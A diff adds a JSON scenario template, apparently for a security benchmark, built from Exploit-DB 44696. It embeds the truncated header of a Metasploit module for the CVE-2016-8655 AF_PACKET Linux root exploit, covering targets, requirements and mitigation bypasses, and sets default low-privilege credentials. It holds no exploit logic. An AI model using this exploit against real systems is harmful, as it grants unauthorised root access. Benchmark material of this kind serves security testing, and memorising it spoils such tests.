@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44696",
+  "category": "",
+  "attack_technique": "",
+  "cwe": "",
+  "description": "Linux privilege escalation: Linux 4.4.0 < 4.4.0-53 - 'AF_PACKET chocobo_root' Local Privilege Escalation (Metasploit) (CVE-2016-8655)\n\nExploit source code (44696.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AF_PACKET chocobo_root Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a race condition and use-after-free in the\n        packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in\n        the Linux kernel to execute code as root (CVE-2016-8655).\n\n        The bug was initially introduced in 2011 and patched in 2016 in version\n        4.4.0-53.74, potentially affecting a large number of kernels; however\n        this exploit targets only systems using Ubuntu (Trusty / Xenial) kernels\n        4.4.0 < 4.4.0-53, including Linux distros based on Ubuntu, such as\n        Linux Mint.\n\n        The target system must have unprivileged user namespaces enabled and\n        two or more CPU cores.\n\n        Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation\n        may crash the kernel.\n\n        This module has been tested successfully on Linux Mint 17.3 (x86_64);\n        Linux Mint 18 (x86_64); and Ubuntu 16.04.2 (x86_64) with kernel\n        versions 4.4.0-45-generic and 4.4.0-51-generic.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rebel',        # Discovery and chocobo_root.c exploit\n          'Brendan Coles' # Metasploit\n        ],\n      'DisclosureDate' => 'Aug 12 2016',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'AKA', 'chocobo_root.c' ],\n          [ 'EDB', '40871' ],\n          [ 'CVE', '2016-8655' ],\n          [ 'BID', '94692' ],\n          [ 'URL', 'http://seclists.org/oss-sec/2016/q4/607' ],\n          [ 'URL', 'http://seclists.org/oss-sec/2016/q4/att-621/chocobo_root_c.bin' ],\n          [ 'URL', 'https://github.com/bcoles/kernel-exploits/blob/master/CVE-2016-8655/chocobo_root.c' ],\n          [ 'URL', 'https://bitbucket.org/externalist/1day_exploits/src/master/CVE-2016-8655/CVE-2016-8655_chocobo_root_commented.c' ],\n          [ 'URL', 'https://usn.ubuntu.com/3151-1/' ],\n          [ 'URL', 'https://www.securitytracker.com/id/1037403' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c' ]\n        ],\n      'DefaultTarget'  => 0))\n    register_options [\n      OptInt.new('TIMEOUT', [ true, 'Race timeout (seconds)', '600' ]),\n      OptEnum.new('COMPILE', [ true, 'Compile on \n```",
+  "cve": "CVE-2016-8655",
+  "exploitdb_id": "44696",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44696",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
